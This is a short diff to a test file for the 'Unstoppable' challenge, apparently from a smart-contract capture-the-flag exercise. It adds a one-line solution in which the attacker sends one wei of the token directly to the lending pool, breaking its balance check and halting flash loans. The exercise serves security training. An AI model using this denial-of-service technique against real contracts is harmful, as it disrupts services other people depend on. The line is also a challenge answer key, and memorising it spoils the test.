@@ -40,6 +40,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        await this.token.transfer(this.pool.address, ether('0.000000000000000001'), { from: attacker });
     });
 
     after(async function () {
